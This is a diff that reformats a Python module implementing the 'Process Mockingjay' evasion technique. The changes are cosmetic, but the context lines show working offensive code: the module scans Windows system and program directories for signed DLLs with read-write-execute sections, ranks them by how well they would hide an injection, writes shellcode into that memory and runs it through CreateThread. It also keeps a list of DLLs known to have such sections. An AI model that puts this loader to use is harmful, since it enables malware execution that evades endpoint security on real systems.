@@ -10,16 +10,16 @@ in memory-based evasion.
 Reference: "The Modern Hacker's Playbook" - Part 2.2
 """
 
+import ctypes
+import logging
 import os
 import sys
-import logging
-import ctypes
-from typing import Dict, List, Optional, Tuple
 from dataclasses import dataclass
-from pathlib import Path
+from typing import List, Optional
 
 try:
     import pefile
+
     PEFILE_AVAILABLE = True
 except ImportError:
     PEFILE_AVAILABLE = False
@@ -28,6 +28,7 @@ except ImportError:
 @dataclass
 class MockingjayTarget:
     """Target DLL for Process Mockingjay"""
+
     dll_path: str
     dll_name: str
     rwx_section_name: str
@@ -70,8 +71,9 @@ class ProcessMockingjayEngine:
         if not PEFILE_AVAILABLE:
             self.logger.error("pefile required. Install: pip install pefile")
 
-    def find_targets(self, search_paths: Optional[List[str]] = None,
-                    signed_only: bool = True) -> List[MockingjayTarget]:
+    def find_targets(
+        self, search_paths: Optional[List[str]] = None, signed_only: bool = True
+    ) -> List[MockingjayTarget]:
         """
         Find potential Mockingjay targets (DLLs with RWX sections).
 
@@ -90,10 +92,10 @@ class ProcessMockingjayEngine:
 
         if not search_paths:
             search_paths = [
-                os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32'),
-                os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'SysWOW64'),
-                os.environ.get('ProgramFiles', 'C:\\Program Files'),
-                os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'),
+                os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32"),
+                os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "SysWOW64"),
+                os.environ.get("ProgramFiles", "C:\\Program Files"),
+                os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"),
             ]
 
         targets = []
@@ -106,7 +108,7 @@ class ProcessMockingjayEngine:
 
             for root, dirs, files in os.walk(search_path):
                 for file in files:
-                    if not file.lower().endswith('.dll'):
+                    if not file.lower().endswith(".dll"):
                         continue
 
                     dll_path = os.path.join(root, file)
@@ -138,10 +140,10 @@ class ProcessMockingjayEngine:
                     target = MockingjayTarget(
                         dll_path=dll_path,
                         dll_name=os.path.basename(dll_path),
-                        rwx_section_name=section.Name.decode('utf-8').rstrip('\x00'),
+                        rwx_section_name=section.Name.decode("utf-8").rstrip("\x00"),
                         rwx_offset=section.VirtualAddress,
                         rwx_size=section.Misc_VirtualSize,
-                        is_signed=is_signed
+                        is_signed=is_signed,
                     )
 
                     # Calculate suitability score
@@ -149,7 +151,7 @@ class ProcessMockingjayEngine:
 
                     return target
 
-        except Exception as e:
+        except Exception:
             # Skip problematic DLLs
             pass
 
@@ -169,10 +171,11 @@ class ProcessMockingjayEngine:
         """Check if file is digitally signed"""
         try:
             import subprocess
-            cmd = f'powershell -Command "(Get-AuthenticodeSignature \'{file_path}\').Status -eq \'Valid\'"'
+
+            cmd = f"powershell -Command \"(Get-AuthenticodeSignature '{file_path}').Status -eq 'Valid'\""
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
             return "True" in result.stdout
-        except:
+        except Exception:
             return False
 
     def _calculate_suitability(self, target: MockingjayTarget) -> float:
@@ -193,7 +196,7 @@ class ProcessMockingjayEngine:
             score += 50
 
         # System directory = +30 points
-        if 'system32' in target.dll_path.lower() or 'syswow64' in target.dll_path.lower():
+        if "system32" in target.dll_path.lower() or "syswow64" in target.dll_path.lower():
             score += 30
 
         # Large section = +20 points
@@ -201,12 +204,14 @@ class ProcessMockingjayEngine:
             score += 20
 
         # Microsoft-signed = +40 points (detect by path)
-        if 'windows' in target.dll_path.lower():
+        if "windows" in target.dll_path.lower():
             score += 40
 
         return score
 
-    def rank_targets(self, targets: Optional[List[MockingjayTarget]] = None) -> List[MockingjayTarget]:
+    def rank_targets(
+        self, targets: Optional[List[MockingjayTarget]] = None
+    ) -> List[MockingjayTarget]:
         """
         Rank targets by suitability score.
 
@@ -267,7 +272,7 @@ class ProcessMockingjayEngine:
                 ctypes.c_void_p(shellcode_addr),
                 shellcode,
                 len(shellcode),
-                ctypes.byref(written)
+                ctypes.byref(written),
             )
 
             if not success or written.value != len(shellcode):
@@ -282,12 +287,12 @@ class ProcessMockingjayEngine:
 
             self.logger.info("Executing shellcode...")
             thread_handle = kernel32.CreateThread(
-                None,                           # Security attributes
-                0,                              # Stack size
+                None,  # Security attributes
+                0,  # Stack size
                 ctypes.c_void_p(shellcode_addr),  # Start address
-                None,                           # Parameter
-                0,                              # Creation flags
-                ctypes.byref(thread_id)         # Thread ID
+                None,  # Parameter
+                0,  # Creation flags
+                ctypes.byref(thread_id),  # Thread ID
             )
 
             if not thread_handle:
@@ -399,16 +404,16 @@ KNOWN_VULNERABLE_DLLS = {
     "msys-2.0.dll": {
         "description": "MSYS2 runtime (Visual Studio component)",
         "section": ".text",
-        "notes": "Commonly found in Visual Studio installations"
+        "notes": "Commonly found in Visual Studio installations",
     },
     "cygwin1.dll": {
         "description": "Cygwin POSIX emulation layer",
         "section": ".text",
-        "notes": "Found in Cygwin installations"
+        "notes": "Found in Cygwin installations",
     },
     "Qt5Core.dll": {
         "description": "Qt framework core library",
         "section": ".text",
-        "notes": "Found in Qt-based applications"
+        "notes": "Found in Qt-based applications",
     },
 }
